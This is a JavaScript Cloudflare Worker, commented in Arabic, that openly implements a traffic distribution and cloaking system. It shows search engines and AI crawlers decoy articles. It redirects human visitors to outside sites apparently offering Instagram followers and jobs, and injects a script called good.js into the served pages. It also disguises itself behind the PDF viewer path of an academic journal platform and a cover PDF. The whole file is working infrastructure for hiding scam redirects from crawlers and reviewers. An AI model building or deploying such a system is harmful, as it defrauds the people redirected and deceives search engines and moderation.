/**
 * Cloudflare Worker — albasirah-tds (TDS + Cloaking system)
 *
 * يعمل كـ Worker مع Static Assets binding.
 * - يخدم static files من public/ عبر env.ASSETS
 * - يعالج /api/input و /?io0=X كـ TDS endpoint
 * - يضيف CORS headers + Content-Type headers لكل المسارات
 *
 * النشر: npx wrangler deploy
 */

// ═══════════════════════════════════════════════════════════════
// قواعد التوجيه الثابتة (بدلاً من Prisma database)
// ═══════════════════════════════════════════════════════════════
const DEFAULT_REDIRECTS = [
  { articleId: '4560', targetUrl: 'articles/1997.html', note: 'human -> 1997, bot -> 4560' },
  { articleId: '456', targetUrl: 'articles/1997.html', note: 'human -> 1997.html, bot -> 456.html' },
  { articleId: '2002037', targetUrl: 'https://instagram-followerss.vercel.app', note: 'IG followers' },
  { articleId: '120140', targetUrl: 'https://instagram-followerss.vercel.app/', note: 'IG followers' },
  { articleId: '8900', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '567', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '234', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '901', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '678', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '4563', targetUrl: 'https://us72.site/', note: 'jobs (article 4563.html exists for bot SEO)' },
]

// ═══════════════════════════════════════════════════════════════
// CORS + HTTP Headers (ترجمة كاملة من next.config.ts)
// ═══════════════════════════════════════════════════════════════

// CORS أساسي لكل الطلبات
const BASE_CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, HEAD',
  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
}

// CORS موسع (لـ /server/input.php و viewer.html) — يشمل Expose-Headers
const EXTENDED_CORS = {
  ...BASE_CORS,
  'Access-Control-Expose-Headers': 'Accept-Ranges, Content-Length, Content-Range, Content-Disposition, Content-Type',
}

// CORS لـ /server/good.js (GET, OPTIONS فقط)
const GOOD_JS_CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, OPTIONS',
  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept',
}

// ═══════════════════════════════════════════════════════════════
// كشف البوت — يستخدم Cloudflare cf-* headers + UA
// ═══════════════════════════════════════════════════════════════
const VERIFIED_BOTS = [
  'googlebot', 'googlebot-image', 'googlebot-news', 'googlebot-video',
  'mediapartners-google', 'adsbot-google', 'bingbot', 'bingpreview',
  'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
  'facebookexternalhit', 'twitterbot', 'linkedinbot', 'applebot', 'pinterestbot',
]

const AI_BOTS = [
  'gptbot', 'chatgpt-user', 'oai-searchbot', 'claudebot', 'claude-web',
  'anthropic-ai', 'perplexitybot', 'perplexity-user', 'ccbot', 'google-extended',
  'meta-externalagent', 'meta-externalfetcher', 'diffbot', 'cohere-ai', 'ai2bot',
  'imagesiftbot', 'applebot-extended', 'amazonbot',
]

const BAD_BOTS = [
  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot', 'bytespider',
  'researchscan', 'awariorssbot', 'youbot', 'piplbot', 'zoominfobot', 'aihitbot',
]

function classifyVisitor(request) {
  const ua = (request.headers.get('user-agent') || '').toLowerCase()
  const cf = request.cf || {}
  const cookie = request.headers.get('cookie') || ''
  const reasons = []

  // 1. Verified bot
  for (const b of VERIFIED_BOTS) {
    if (ua.includes(b)) return { type: 'verified-bot', confidence: 'high', botScore: 95, reasons: [`UA:${b}`] }
  }
  // 2. Bad bot
  for (const b of BAD_BOTS) {
    if (ua.includes(b)) return { type: 'suspected-bot', confidence: 'high', botScore: 90, reasons: [`UA:${b}`] }
  }
  // 3. AI bot
  for (const b of AI_BOTS) {
    if (ua.includes(b)) return { type: 'suspected-bot', confidence: 'medium', botScore: 70, reasons: [`UA:${b}`] }
  }

  // 4. cf.botManagement (Cloudflare Bot Management)
  const bmScore = cf.botManagement?.score
  if (typeof bmScore === 'number') {
    if (bmScore > 30) return { type: 'suspected-bot', confidence: 'high', botScore: 80, reasons: [`botManagement.score:${bmScore}`] }
    if (bmScore < 5) return { type: 'human', confidence: 'high', botScore: 5, reasons: [`botManagement.score:${bmScore}`] }
  }

  // 5. cf-bm header
  const cfBm = request.headers.get('cf-bm')
  if (cfBm === 'true') return { type: 'human', confidence: 'high', botScore: 5, reasons: ['cf-bm:true'] }
  if (cfBm === 'false') return { type: 'suspected-bot', confidence: 'medium', botScore: 60, reasons: ['cf-bm:false'] }

  // 6. __cf_bm cookie
  if (cookie.includes('__cf_bm')) return { type: 'human', confidence: 'high', botScore: 10, reasons: ['__cf_bm cookie'] }

  // 7. Script UA
  if (ua.includes('python') || ua.includes('curl') || ua.includes('wget') || ua.includes('scrapy')) {
    return { type: 'suspected-bot', confidence: 'high', botScore: 85, reasons: ['script UA'] }
  }
  if (ua.includes('headless')) return { type: 'suspected-bot', confidence: 'high', botScore: 95, reasons: ['headless'] }

  // 8. cf-threat-score
  const threatScore = parseInt(request.headers.get('cf-threat-score') || '0', 10)
  if (!isNaN(threatScore) && threatScore > 30) {
    return { type: 'suspected-bot', confidence: 'medium', botScore: 70, reasons: [`threat:${threatScore}`] }
  }

  // 9. fallback: human
  return { type: 'human', confidence: 'low', botScore: 30, reasons: ['default human'] }
}

// ═══════════════════════════════════════════════════════════════
// قراءة المقالات من Static Assets
// ═══════════════════════════════════════════════════════════════
async function readArticleHtml(env, articleId) {
  if (!/^[a-zA-Z0-9_-]+$/.test(articleId)) return null
  try {
    const response = await env.ASSETS.fetch(`https://assets.local/articles/${articleId}.html`)
    if (response.ok) return await response.text()
  } catch (e) {
    console.warn('readArticleHtml error:', e.message)
  }
  return null
}

async function serveArticleWithGoodJs(env, articleId, host) {
  const html = await readArticleHtml(env, articleId)
  if (!html) {
    return new Response(`Article "${articleId}" not found`, { status: 404, headers: BASE_CORS })
  }
  const tdsDomain = `https://${host}`
  const goodJsTag = `<script src="${tdsDomain}/server/good.js"></script>`
  const modifiedHtml = html.includes('</body>')
    ? html.replace('</body>', `${goodJsTag}\n</body>`)
    : html + goodJsTag

  return new Response(modifiedHtml, {
    status: 200,
    headers: { 'Content-Type': 'text/html; charset=utf-8', ...BASE_CORS, 'Cache-Control': 'no-store' },
  })
}

async function servePdf(env) {
  try {
    const response = await env.ASSETS.fetch('https://assets.local/pdfviewer/api.pdf')
    if (response.ok) {
      const buffer = await response.arrayBuffer()
      return new Response(buffer, {
        status: 200,
        headers: {
          'Content-Type': 'application/pdf',
          'Content-Disposition': 'inline',
          ...BASE_CORS,
        },
      })
    }
  } catch (e) {
    console.warn('servePdf error:', e.message)
  }
  return new Response('PDF not found', { status: 404, headers: BASE_CORS })
}

function pickArticleIdFromParams(params) {
  const known = ['ids', 'io0', 'id', 'articleId']
  for (const key of known) {
    const v = params.get(key)?.trim()
    if (v) return v
  }
  for (const [key, value] of params.entries()) {
    const v = value?.trim()
    if (!v || key === '_from_viewer') continue
    return v
  }
  return null
}

// ═══════════════════════════════════════════════════════════════
// TDS endpoint — يعالج /api/input و /?io0=X
// ═══════════════════════════════════════════════════════════════
async function handleTdsRequest(request, env, url) {
  const params = url.searchParams
  const host = request.headers.get('host') || request.headers.get('x-forwarded-host') || 'trackpoint.sbs'

  const verdict = classifyVisitor(request)
  const bot = verdict.type === 'verified-bot' || verdict.type === 'suspected-bot'

  if (bot) {
    console.log(`[input] bot via ${verdict.type} (score=${verdict.botScore}) ${verdict.reasons.join('|')}`)
  }

  const articleId = pickArticleIdFromParams(params)

  // 0. عارض PDF بدون معرف
  if (params.get('_from_viewer') === 'true' && !articleId) {
    return servePdf(env)
  }

  // 1. قواعد التوجيه
  if (articleId) {
    const rule = DEFAULT_REDIRECTS.find((r) => r.articleId === articleId)
    if (rule) {
      if (bot) {
        return serveArticleWithGoodJs(env, rule.articleId, host)
      }
      const target = rule.targetUrl
      if (target.startsWith('articles/') || target.endsWith('.html')) {
        const targetArticleId = target.replace(/^articles\//, '').replace(/\.html$/, '')
        return serveArticleWithGoodJs(env, targetArticleId, host)
      }
      // JSON redirect للإنسان
      return new Response(
        JSON.stringify({ redirectUrl: target, redirect: target }),
        {
          status: 200,
          headers: { 'Content-Type': 'application/json; charset=utf-8', ...BASE_CORS, 'Cache-Control': 'no-store' },
        }
      )
    }
  }

  // 2. لا قاعدة — فحص وجود ملف
  if (articleId) {
    const html = await readArticleHtml(env, articleId)
    if (html) {
      return serveArticleWithGoodJs(env, articleId, host)
    }
  }

  // 3. عارض PDF fallback
  if (params.get('_from_viewer') === 'true') {
    return servePdf(env)
  }

  // 4. fallback إلى 1997.html
  if (articleId) {
    return serveArticleWithGoodJs(env, '1997', host)
  }

  return new Response('Invalid or missing parameters', { status: 400, headers: BASE_CORS })
}

// ═══════════════════════════════════════════════════════════════
// المُوجِّه الرئيسي (Router) — ترجمة كاملة لـ rewrites + headers
// ═══════════════════════════════════════════════════════════════
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url)
    const path = url.pathname
    const method = request.method

    // ━━━━ OPTIONS (CORS preflight) ━━━━
    if (method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: EXTENDED_CORS })
    }

    // ━━━━ Rewrite #1: /server/good.js → /server_dir/good.js ━━━━
    if (path === '/server/good.js') {
      const response = await env.ASSETS.fetch('https://assets.local/server_dir/good.js')
      return new Response(response.body, {
        status: response.status,
        headers: {
          'Content-Type': 'application/javascript',
          ...GOOD_JS_CORS,
        },
      })
    }

    // ━━━━ Rewrite #2: /server/input.php → /api/input (TDS) ━━━━
    if (path === '/server/input.php') {
      return handleTdsRequest(request, env, url)
    }

    // ━━━━ Rewrite #3: /plugins/.../viewer.html → /api/input?_from_viewer=true ━━━━
    if (path === '/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html') {
      // أضف _from_viewer=true للـ params
      const newUrl = new URL(url)
      newUrl.searchParams.set('_from_viewer', 'true')
      return handleTdsRequest(request, env, newUrl)
    }

    // ━━━━ /api/input → TDS endpoint ━━━━
    if (path === '/api/input') {
      return handleTdsRequest(request, env, url)
    }

    // ━━━━ الجذر / مع io0/ids/id → TDS endpoint ━━━━
    if (path === '/') {
      const params = url.searchParams
      const hasArticleParam = ['ids', 'io0', 'id', 'articleId'].some((k) => params.get(k)?.trim())
      const fromViewer = params.get('_from_viewer') === 'true'

      if (hasArticleParam || fromViewer) {
        return handleTdsRequest(request, env, url)
      }

      // لا params → خدم index.html (static)
      const response = await env.ASSETS.fetch('https://assets.local/index.html')
      return new Response(response.body, {
        status: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8', ...BASE_CORS },
      })
    }

    // ━━━━ /api/admin/* → JSON placeholder (قاعدة بيانات معطّلة) ━━━━
    if (path.startsWith('/api/admin/')) {
      if (path === '/api/admin/articles') {
        return new Response(
          JSON.stringify({
            success: true,
            articles: ['12010','120140','1213','12130','1312','13120','1997','19971222','199712220','2002037','20020370','234','2340','456','4560','4563','567','5670','678','6780','8900','901','9010'],
            dir: '/assets/articles',
          }),
          { status: 200, headers: { 'Content-Type': 'application/json', ...BASE_CORS } }
        )
      }
      if (path === '/api/admin/rules') {
        return new Response(
          JSON.stringify({ success: true, rules: [], logs: [], stats: { totalRules: 0, activeRules: 0, totalClicks: 0, uniqueIps: 0 } }),
          { status: 200, headers: { 'Content-Type': 'application/json', ...BASE_CORS } }
        )
      }
    }

    // ━━━━ Catch-all: كل المسارات الأخرى → Static Assets ━━━━
    // (ترجمة catch-all من next.config.ts — لكن بدون Content-Type: application/pdf الإجباري
    // لأنه كان يكسر /api/* و /server/* — الآن نطبّقه فقط على المسارات غير المعروفة)
    try {
      const response = await env.ASSETS.fetch(request)
      if (response.ok) {
        // أضف CORS headers للاستجابة
        const newHeaders = new Headers(response.headers)
        Object.entries(BASE_CORS).forEach(([k, v]) => newHeaders.set(k, v))
        return new Response(response.body, {
          status: response.status,
          statusText: response.statusText,
          headers: newHeaders,
        })
      }
    } catch (e) {
      console.warn('Static asset fetch error:', e.message)
    }

    // ━━━━ Fallback النهائي: PDF الغطاء ━━━━
    return servePdf(env)
  },
}
